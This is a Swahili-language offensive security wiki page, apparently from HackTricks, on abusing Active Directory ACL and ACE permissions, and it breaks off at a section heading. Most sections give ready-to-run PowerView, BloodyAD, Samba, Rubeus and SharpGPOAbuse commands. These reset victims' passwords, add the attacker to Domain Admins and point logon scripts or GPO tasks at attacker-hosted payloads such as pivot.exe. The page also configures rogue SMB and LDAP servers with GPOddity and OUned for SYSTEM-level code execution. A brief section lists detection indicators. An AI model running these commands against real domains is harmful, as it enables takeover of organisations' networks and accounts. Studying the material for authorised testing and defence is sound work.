# Matumizi Mabaya ya ACL/ACE za Active Directory

{{#include ../../../banners/hacktricks-training.md}}

**Ukurasa huu ni muhtasari wa mbinu zilizoelezwa katika** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **na** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Kwa maelezo zaidi, angalia makala asili.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Haki za GenericAll kwa Mtumiaji**

Ruhusa hii humpa mshambuliaji udhibiti kamili wa akaunti ya mtumiaji anayelengwa. Baada ya kuthibitisha haki za `GenericAll` kwa kutumia amri ya `Get-ObjectAcl`, mshambuliaji anaweza:

- **Kubadilisha Nenosiri la Mtumiaji Anayelengwa**: Kwa kutumia `net user <username> <password> /domain`, mshambuliaji anaweza kuweka upya nenosiri la mtumiaji.
- Kutoka Linux, unaweza kufanya vivyo hivyo kupitia SAMR ukitumia Samba `net rpc`:<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **Ikiwa akaunti imezimwa, futa alama ya UAC**: `GenericAll` huruhusu kuhariri `userAccountControl`. Kutoka Linux, BloodyAD inaweza kuondoa alama ya `ACCOUNTDISABLE`:<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**: Weka SPN kwenye akaunti ya mtumiaji ili iweze kufanyiwa kerberoasting, kisha tumia Rubeus na targetedKerberoast.py kutoa na kujaribu kuvunja hash za ticket-granting ticket (TGT).

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Targeted ASREPRoasting**: Zima pre-authentication kwa mtumiaji, na kufanya akaunti yake iwe katika hatari ya ASREPRoasting.

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**: Ukiwa na `GenericAll` kwa mtumiaji, unaweza kuongeza credential inayotegemea certificate na kujithibitisha kama mtumiaji huyo bila kubadilisha nenosiri lake. Tazama:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Haki za GenericAll kwenye Group**

Privileg hii humruhusu mshambulizi kudhibiti uanachama wa group ikiwa ana haki za `GenericAll` kwenye group kama `Domain Admins`. Baada ya kutambua distinguished name ya group kwa kutumia `Get-NetGroup`, mshambulizi anaweza:

- **Kujiongeza kwenye Group ya Domain Admins**: Hili linaweza kufanywa kwa kutumia amri za moja kwa moja au modules kama Active Directory au PowerSploit.

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- Kutoka Linux unaweza pia kutumia BloodyAD kujiongeza kwenye makundi yoyote unapokuwa na ruhusa za GenericAll/Write membership juu yake. Ikiwa kundi lengwa limejumuishwa ndani ya “Remote Management Users”, utapata mara moja ufikiaji wa WinRM kwenye host zinazoheshimu kundi hilo:<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **GenericAll / GenericWrite / Write kwenye Computer/User**

Kuwa na ruhusa hizi kwenye object ya computer au akaunti ya user kunaruhusu:

- **Kerberos Resource-based Constrained Delegation**: Huwezesha kuteka object ya computer.
- **Shadow Credentials**: Tumia mbinu hii kuiga akaunti ya computer au user kwa kutumia vibaya ruhusa za kuunda shadow credentials.

## Kuhamisha object kwenye ruhusa za OU zilizorithiwa

Njia inaweza kuunganisha **ruhusa za kuhamisha akaunti** na **ruhusa za kuandika zilizorithiwa kutoka kwa OU lengwa**, hata kama principal yoyote kati ya hizo haiwezi mwanzoni kurekebisha sifa nyeti za akaunti. Hakikisha ruhusa za kuhamisha object chanzi na `CreateChild` kwenye OU lengwa, hamisha object, kisha kagua tena DACL yake inayotumika. Kwa mfano, `Set-DomainObjectDN -Identity <user> -DestinationDN 'OU=<destination>,DC=<domain>,DC=<tld>'` ya powerview.py huhamisha user; kisha group inayodhibitiwa yenye `GenericWrite` iliyorithiwa kwenye OU hiyo inaweza kuongeza [shadow credential](shadow-credentials.md). Kuhamisha object hakutengenezi ruhusa iliyorithiwa peke yake.<sup>[[18]](#references)</sup>

Ikiwa una `GenericAll` kwenye OU lakini hakuna ACE inayofaa kurithiwa, `bloodyAD --host <dc> -d <domain> -k add genericAll 'OU=<destination>,DC=<domain>,DC=<tld>' <controlled-user>` inaweza kuongeza ACE kwa descendants wake. Jaribu akaunti lengwa kando: **akaunti zinazolindwa na AdminSDHolder zina inheritance iliyozimwa**, kwa hivyo ACE ya OU inaweza kuathiri users wa kawaida lakini ishindwe kwa user aliyelindwa. Tazama [AdminSDHolder and SDProp](../privileged-groups-and-token-privileges.md#adminsdholder-group).<sup>[[18]](#references)</sup>

Njia tofauti ya kutumia vibaya ipo pale script ya privileged scheduled cleanup inapochagua OUs kulingana na ACEs zinazoweza kuathiriwa na attacker, kisha kuendesha `Set-ADObject -Clear adminCount` **na** `$acl.SetAccessRuleProtection($False, $False)` kwenye descendants zake. Ikiwa unaweza kurekebisha DACL ya OU, ipe group inayokaguliwa na script ACE ya `ExtendedRight` au `GenericAll` inayohitajika; hakikisha kando kwamba unaweza kuanzisha task. Task ya privileged inaweza kisha kuwezesha inheritance tena kwenye akaunti iliyokuwa imelindwa, na hivyo kuruhusu ACE ya OU kutumika. Thibitisha script husika, ruhusa ya kuanzisha task, na DACL inayotokana; kufuta `adminCount` pekee hakuwashi inheritance tena, na SDProp inaweza kulinda tena akaunti ambazo bado zimo kwenye protected groups.<sup>[[18]](#references)</sup>

## **WriteProperty kwenye Group**

Ikiwa user ana ruhusa za `WriteProperty` kwenye objects zote za group maalum (kwa mfano, `Domain Admins`), anaweza:

- **Kujiongeza kwenye Group ya Domain Admins**: Hili linawezekana kwa kuunganisha amri za `net user` na `Add-NetGroupUser`; njia hii huwezesha kupandisha privileges ndani ya domain.

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **Self (Self-Membership) kwenye Group**

Privilege hii huwawezesha attackers kujiongeza kwenye groups maalum, kama vile `Domain Admins`, kupitia commands zinazobadilisha uanachama wa group moja kwa moja. Kutumia mfuatano ufuatao wa commands huwawezesha kujiongeza:

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Self-Membership)**

Ruhusa hii inayofanana huwaruhusu washambuliaji kujiongeza moja kwa moja kwenye vikundi kwa kurekebisha sifa za vikundi ikiwa wana haki ya `WriteProperty` kwenye vikundi hivyo. Uthibitishaji na utekelezaji wa ruhusa hii hufanywa kwa:

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

Kuwa na `ExtendedRight` kwa mtumiaji kuhusu `User-Force-Change-Password` huruhusu kuweka upya nywila bila kujua nywila ya sasa. Haki hii inaweza kuthibitishwa na kutumiwa kupitia PowerShell au zana mbadala za command-line, kwa kutumia mbinu kadhaa za kuweka upya nywila ya mtumiaji, zikiwemo sessions shirikishi na amri za mstari mmoja kwa mazingira yasiyo shirikishi. Amri hizi zinaanzia kwenye matumizi rahisi ya PowerShell hadi kutumia `rpcclient` kwenye Linux, zikionyesha unyumbufu wa vectors za mashambulizi.

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **WriteOwner kwenye Kikundi**

Ikiwa mshambulizi atagundua kuwa ana haki za `WriteOwner` kwenye kikundi, anaweza kubadilisha umiliki wa kikundi hicho na kuumiliki yeye mwenyewe. Hili lina athari kubwa hasa ikiwa kikundi husika ni `Domain Admins`, kwa kuwa kubadilisha umiliki huruhusu udhibiti mpana zaidi wa sifa na wanachama wa kikundi. Mchakato huu unahusisha kutambua object sahihi kwa kutumia `Get-ObjectAcl`, kisha kutumia `Set-DomainObjectOwner` kubadilisha mmiliki, kwa SID au jina.

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **GenericWrite kwa User**

Ruhusa hii humwezesha mshambuliaji kurekebisha sifa za user. Hasa, akiwa na ufikiaji wa `GenericWrite`, mshambuliaji anaweza kubadilisha njia ya logon script ya user ili kutekeleza script hasidi user anapoingia. Hili hufanywa kwa kutumia amri ya `Set-ADObject` kusasisha sifa ya `scriptpath` ya user lengwa ili ielekeze kwenye script ya mshambuliaji.

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

ACE ya `WriteProperty` yenye wigo finyu zaidi na inayohusu attribute ya [`scriptPath`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e) ya mtumiaji inaweza kutosha; `GenericWrite` haihitajiki. Oanisha haki hiyo ya attribute na script inayoweza kuandikwa chini ya mti wa `SYSVOL\<domain>\scripts` au `NETLOGON` wa domain, kisha tathmini kama kuna uwezekano mtumiaji lengwa ataingia na kufikia script hiyo. Script huendeshwa katika muktadha wa mtumiaji huyo wakati wa kuingia. Kagua ACL zinazotumika za AD na za faili/share kando; ACE ya Allow inayolingana au directory inayoweza kuandikwa pekee haithibitishi kuwa njia nzima imekamilika.

## **GenericWrite kwenye Group**

Kwa fursa hii, washambuliaji wanaweza kubadilisha uanachama wa group, kwa mfano kwa kujiongeza wenyewe au kuongeza watumiaji wengine kwenye group maalum. Mchakato huu unahusisha kuunda credential object, kuitumia kuongeza au kuondoa watumiaji kwenye group, na kuthibitisha mabadiliko ya uanachama kwa kutumia amri za PowerShell.

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- Kutoka Linux, Samba `net` inaweza kuongeza/kuondoa wanachama unapokuwa na `GenericWrite` kwenye kundi (inafaa wakati PowerShell/RSAT hazipatikani):<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

Kuwa mmiliki wa object ya AD na kuwa na ruhusa za `WriteDACL` juu yake humwezesha mshambulizi kujipa ruhusa za `GenericAll` juu ya object hiyo. Hili hutekelezwa kupitia urekebishaji wa ADSI, na kumpa udhibiti kamili juu ya object hiyo pamoja na uwezo wa kubadilisha uanachama wake wa group. Hata hivyo, kuna vikwazo unapojaribu kutumia vibaya ruhusa hizi kwa kutumia cmdlets za `Set-Acl` / `Get-Acl` za moduli ya Active Directory.<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### Udhibiti wa haraka wa WriteDACL/WriteOwner (PowerView)

Unapokuwa na `WriteOwner` na `WriteDacl` kwenye akaunti ya mtumiaji au akaunti ya huduma, unaweza kuchukua udhibiti kamili na kuweka upya nenosiri lake ukitumia PowerView bila kujua nenosiri la zamani:

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

Vidokezo:
- Huenda ukahitaji kwanza kubadilisha mmiliki awe wewe ikiwa una `WriteOwner` pekee:

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- Thibitisha ufikiaji kwa kutumia itifaki yoyote (SMB/LDAP/RDP/WinRM) baada ya kuweka upya nenosiri.

## **Replication kwenye Domain (DCSync)**

Shambulio la DCSync hutumia ruhusa maalum za replication kwenye domain kujifanya Domain Controller na kusawazisha data, ikijumuisha credentials za watumiaji. Mbinu hii yenye nguvu inahitaji ruhusa kama `DS-Replication-Get-Changes`, zinazowawezesha washambuliaji kutoa taarifa nyeti kutoka kwenye mazingira ya AD bila kupata ufikiaji wa moja kwa moja wa Domain Controller.<sup>[[5]](#references)</sup> [**Jifunze zaidi kuhusu shambulio la DCSync hapa.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Ufikiaji uliokasimiwa wa kusimamia Group Policy Objects (GPOs) unaweza kusababisha hatari kubwa za usalama. Kwa mfano, ikiwa mtumiaji kama `offense\spotless` amekasimiwa haki za usimamizi wa GPO, anaweza kuwa na ruhusa kama **WriteProperty**, **WriteDacl**, na **WriteOwner**. Ruhusa hizi zinaweza kutumiwa vibaya kwa madhumuni hasidi, kama ilivyotambuliwa kwa kutumia PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Orodhesha Ruhusa za GPO

Ili kutambua GPO zilizosanidiwa vibaya, cmdlets za PowerSploit zinaweza kuunganishwa. Hii huruhusu kugundua GPO ambazo mtumiaji maalum ana ruhusa ya kusimamia: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Kompyuta Zilizotumia Sera Fulani**: Inawezekana kubaini kompyuta ambazo GPO maalum inazihusu, ili kusaidia kuelewa upeo wa athari zinazoweza kutokea. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Sera Zinazotumika kwenye Kompyuta Fulani**: Ili kuona sera zinazotumika kwenye kompyuta maalum, amri kama `Get-DomainGPO` zinaweza kutumiwa.

**OUs Zinazotumia Sera Fulani**: Vitengo vya shirika (OUs) vinavyoathiriwa na sera fulani vinaweza kutambuliwa kwa kutumia `Get-DomainOU`.

Unaweza pia kutumia zana ya [**GPOHound**](https://github.com/cogiceo/GPOHound) kuorodhesha GPO na kupata matatizo ndani yake.

### Tumia Vibaya GPO - New-GPOImmediateTask

GPO zilizosanidiwa vibaya zinaweza kutumiwa kutekeleza code, kwa mfano, kwa kuunda task ya ratiba inayotekelezwa mara moja. Hili linaweza kufanywa ili kuongeza mtumiaji kwenye kikundi cha wasimamizi wa ndani kwenye mashine zilizoathiriwa, na hivyo kuongeza marupurupu kwa kiasi kikubwa:

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### GroupPolicy module - Abuse GPO

Moduli ya GroupPolicy, ikiwa imesakinishwa, huruhusu kuunda na kuunganisha GPO mpya, na kuweka mapendeleo kama vile thamani za registry ili kutekeleza backdoors kwenye kompyuta zilizoathiriwa. Njia hii inahitaji GPO isasishwe na mtumiaji aingie kwenye kompyuta ili utekelezaji ufanyike:

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - Kutumia vibaya GPO

SharpGPOAbuse hutoa njia ya kutumia vibaya GPO zilizopo kwa kuongeza tasks au kubadilisha mipangilio bila kuhitaji kuunda GPO mpya. Zana hii inahitaji kubadilisha GPO zilizopo au kutumia zana za RSAT kuunda GPO mpya kabla ya kutekeleza mabadiliko:

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### Kulazimisha Usasishaji wa Sera

Usasishaji wa GPO kwa kawaida hufanyika takriban kila dakika 90. Ili kuharakisha mchakato huu, hasa baada ya kufanya mabadiliko, amri ya `gpupdate /force` inaweza kutumika kwenye kompyuta lengwa ili kulazimisha usasishaji wa sera mara moja. Amri hii huhakikisha kuwa mabadiliko yoyote kwenye GPO yanatumika bila kusubiri mzunguko unaofuata wa usasishaji wa kiotomatiki.

### Jinsi Inavyofanya Kazi

Ukikagua Scheduled Tasks za GPO fulani, kama vile `Misconfigured Policy`, unaweza kuthibitisha kuwa kazi kama `evilTask` zimeongezwa. Kazi hizi huundwa kupitia scripts au zana za mstari wa amri zinazolenga kubadilisha tabia ya mfumo au kuongeza haki.

Muundo wa kazi, kama unavyoonyeshwa katika faili ya usanidi ya XML iliyozalishwa na `New-GPOImmediateTask`, unaeleza maelezo mahususi ya kazi iliyopangwa — ikiwa ni pamoja na amri itakayotekelezwa na vichochezi vyake. Faili hii inaonyesha jinsi kazi zilizopangwa zinavyofafanuliwa na kusimamiwa ndani ya GPO, na kutoa njia ya kutekeleza amri au scripts za aina yoyote kama sehemu ya utekelezaji wa sera.

### Watumiaji na Vikundi

GPO pia huruhusu kubadilisha uanachama wa watumiaji na vikundi kwenye mifumo lengwa. Kwa kuhariri faili za sera za Users and Groups moja kwa moja, washambuliaji wanaweza kuongeza watumiaji kwenye vikundi vyenye mamlaka ya juu, kama vile kikundi cha ndani cha `administrators`. Hili linawezekana kupitia ugawaji wa ruhusa za kusimamia GPO, unaoruhusu kubadilisha faili za sera ili kuongeza watumiaji wapya au kubadilisha uanachama wa vikundi.

Faili ya usanidi ya XML ya Users and Groups inaeleza jinsi mabadiliko haya yanavyotekelezwa. Kwa kuongeza maingizo kwenye faili hii, watumiaji mahususi wanaweza kupewa haki zilizoinuliwa kwenye mifumo iliyoathiriwa. Mbinu hii hutoa njia ya moja kwa moja ya kuongeza haki kupitia udanganyifu wa GPO.

Kwa mipangilio ya usalama kama vile uanachama wa vikundi vya ndani na haki za watumiaji, kagua pia template ya GPO iliyotumika kwenye `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` pamoja na ACL ya saraka ya `SecEdit`. Saraka au faili inayoweza kuandikwa ni kidokezo cha ukaguzi: ufikiaji halisi wa share ya SYSVOL, ACL za deny na zilizorithiwa, ruhusa za kontena la Group Policy, upeo wa sera, na uonyeshaji upya wa mteja bado huamua iwapo mabadiliko yanaweza kuanza kutumika. Kuwa mwanachama wa kikundi kinachoitwa “GPO Managers” pekee hakuthibitishi kuwa una haki za kuhariri. [Microsoft inaeleza njia hii ya template na mgawanyo kati ya kontena la Group Policy na template.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

Zaidi ya hayo, mbinu nyingine za kutekeleza code au kudumisha persistence, kama vile kutumia scripts za kuingia/kutoka, kurekebisha funguo za registry za autoruns, kusakinisha software kupitia faili za .msi, au kuhariri usanidi wa huduma, zinaweza pia kuzingatiwa. Mbinu hizi hutoa njia mbalimbali za kudumisha ufikiaji na kudhibiti mifumo lengwa kupitia matumizi mabaya ya GPO.

### Kuelekeza upataji wa GPC/GPT kwenye huduma ghushi zinazothibitisha utambulisho

GPO ina LDAP **Group Policy Container (GPC)** yenye metadata na **Group Policy Template (GPT)** inayohifadhiwa kwenye SMB na yenye faili za sera. Wakati wa usasishaji, mteja hufuata `gPLink` ya kontena, husoma GPC iliyorejelewa na `gPCFileSysPath` yake, kisha hupakua GPT kutoka kwenye njia hiyo ya UNC. Kwa hiyo, ufikiaji wa kuandika kwenye GPC yenyewe au kwenye `gPLink` ya OU, Site au Domain unaweza kutumiwa kusababisha uchakataji wa sera wenye mamlaka ya juu.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### Kuweka sumu kwenye `gPCFileSysPath` kwa kutumia GPOddity

Ikiwa principal inayodhibitiwa inaweza kuandika kwenye GPC lengwa (moja kwa moja au kupitia **NTLM relay to LDAP**), badilisha `gPCFileSysPath` iwe njia ya UNC inayopangishwa na mshambuliaji. [GPOddity](https://github.com/synacktiv/GPOddity) huweka mabadiliko ya LDAP kiotomatiki na kutoa GPT hasidi yenye faili za sera zinazotegemea modules au Immediate Task ambayo mteja wa Group Policy hutekeleza kama `NT AUTHORITY\SYSTEM`.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Share ya SMB isiyohitaji utambulisho au inayokubali credentials zozote haitoshi kwa wateja wa sasa wa Windows: SMB Secure Negotiate huhitaji uthibitisho kwamba uthibitishaji umefaulu, kwa hiyo huduma ghushi lazima ithibitishe utambulisho wa domain, itoe ufunguo wa kikao cha SMB na isaini majibu yake kwa usahihi. Katika hali ya embedded, sanidi GPOddity kwa kutumia akaunti ya mashine inayodhibitiwa na ufunguo wake wa huduma, kisha uchague payload ya upande wa kompyuta au mtumiaji katika sehemu ya `[COMMANDS]`.<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**Hali ya pekee ya User GPO:** baada ya MS16-072, Windows bado huunda SMB2 sessions mbili katika **TCP connection** moja: user session husoma `GPT.INI`, kisha computer-account session husoma usanidi unaotumika, kama vile `ScheduledTasks.xml`. Kwa hiyo, rogue server lazima ihifadhi hali ya authentication, session keys na signing keys kwa kutumia SMB2 `SessionId`, si socket pekee. Scapy fork iliyojumuishwa kwenye GPOddity/OUned hutekeleza hili kupitia `SMBStreamSocketMultiplexing` na `SMBServer` inayotambua multiplexing; server za Impacket/Scapy zenye session moja vinginevyo hutumia tena signing state isiyo sahihi na hushindwa kwenye user policies.<sup>[[15]](#references)</sup>

#### `gPLink` poisoning kupitia OUned

Kwa `WriteGPLink`, `GenericWrite` au udhibiti sawa juu ya OU, Site au Domain, mshambuliaji anaweza kuongeza link ambayo GPC DN yake hutolewa na LDAP host anayedhibitiwa na mshambuliaji. Primitive hii iliwasilishwa awali na Petros Koutroumpis; [OUned](https://github.com/synacktiv/OUned) huendesha kiotomatiki uandishi wa LDAP na mnyororo hasidi wa GPC/GPT.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

Mwathiriwa kwanza hujithibitisha kwa huduma ya LDAP bandia na kupokea GPC ambayo `gPCFileSysPath` yake inaelekeza kwenye huduma ya SMB bandia; kisha hujithibitisha kwa SMB na kutumia GPT iliyotolewa. Kwa hiyo, OUned inahitaji akaunti yenye LDAP SPN, akaunti ya mashine yenye HOST SPN kwa SMB (akaunti hiyo hiyo ya mashine inaweza kutimiza mahitaji yote mawili), na utatuzi wa DNS au uelekezaji wa nyuma unaotuma porti 389 na 445 kwa host ya operator.<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

OUned's Scapy LDAP server iliyopachikwa huthibitisha Kerberos/SPNEGO kwa kutumia service key halisi inayodhibitiwa na hutoa data yoyote ya GPC kutoka JSON. Key tupu ya JSON huwakilisha rootDSE, viambishi awali vya `base64:` huwakilisha thamani za binary, na server inasaidia add/delete/modify/search pamoja na utafutaji wa `BASE`, `LEVEL` na `SUBTREE`; inaweza kujadiliana kuhusu kutokuwa na ulinzi, integrity au confidentiality. Hii hufanya service iweze kutumika tena pale Windows component nyingine inapofuata LDAP reference inayodhibitiwa na mshambulizi lakini inasisitiza LDAP iliyothibitishwa.<sup>[[15]](#references)</sup>

Usidhani kuwa kusawazisha nenosiri la akaunti kwenye dummy domain kunazalisha kila Kerberos key: RC4 hutokana na nenosiri, ilhali AES string-to-key hutumia pia salt inayotokana na hostname/domain ya principal. Kutoa AES key halisi ya akaunti kwa `KerberosSSP` huepusha kulazimisha RC4 kupitia mabadiliko yanayoweza kutambuliwa kwenye `msDS-SupportedEncryptionTypes` ya machine account inayoweza kujibadilisha yenyewe.<sup>[[15]](#references)</sup>

#### Vigezo vya uchunguzi

Linganisha mabadiliko ya `gPCFileSysPath` au `gPLink` na mabadiliko ya toleo la GPO pamoja na XML mpya za Immediate/Scheduled Task. Chunguza viungo vinavyoelekeza kwenye naming context zisizotarajiwa, UNC host zilizo nje ya seti iliyoidhinishwa ya DC/SYSVOL, rekodi za DNS zinazoelekeza upya majina ya machine account, tiketi za LDAP/CIFS service kwa machine account zisizo za kawaida, na mabadiliko ya `msDS-SupportedEncryptionTypes` yanayowezesha RC4.<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` kwenye OU/domain hukuruhusu kurekebisha attribute ya `gPLink` ya container lengwa na **kulazimisha GPO iliyopo itumike** bila kuhariri GPO yenyewe. Hili huwa muhimu GPO iliyounganishwa tayari inaporejelea maudhui ya mbali kupitia **UNC paths** (`\\HOST\share\...`), kwa sababu watumiaji waliothibitishwa wanaweza kusoma **SYSVOL** na kutafuta sera zinazoweza kutumika tena wakiwa offline.<sup>[[11]](#references)</sup>

Mtiririko wa kazi kwa muhtasari:

1. Tumia BloodHound kutambua principal mwenye `WriteGPLink` kwenye OU na kuorodhesha kompyuta/watumiaji walio ndani ya OU hiyo.
2. Nakili `SYSVOL` kwa ruhusa ya kusoma pekee na uchanganue GPO ukitafuta **Software Installation**, **drive mappings** (`Drives.xml`), na **logon/startup scripts** zinazorejelea UNC paths.
3. Pendelea sera zinazoelekeza kwenye **hostname ya moja kwa moja** (kwa mfano `\\DC02\share\pkg.msi`) badala ya DFS/domain-namespace paths, kwa sababu paths zinazotegemea hostname ni rahisi zaidi kuelekeza upya kwa L2 spoofing.
4. Ongeza GUID ya GPO iliyochaguliwa kwenye `gPLink` ya OU lengwa ili victim ichakate sera hiyo iliyopo.
5. Kwenye broadcast domain hiyo hiyo, fanya ARP spoof ya UNC host na uhusishe IP yake ndani ya mashine yako (`ip addr add <target_ip>/32 dev <iface>`) ili trafiki ya SMB ya victim ifike kwenye host yako.
6. Toa path/filename inayotarajiwa kutoka kwa attacker SMB server (kwa mfano `smbserver.py`) na usubiri uchakataji wa kawaida wa sera.

Mfano wa ukusanyaji wa `SYSVOL` na ulinganishaji wa GPO:

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

Unganisha GPO iliyopo na OU lengwa:

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Software Installation UNC hijack -> SYSTEM

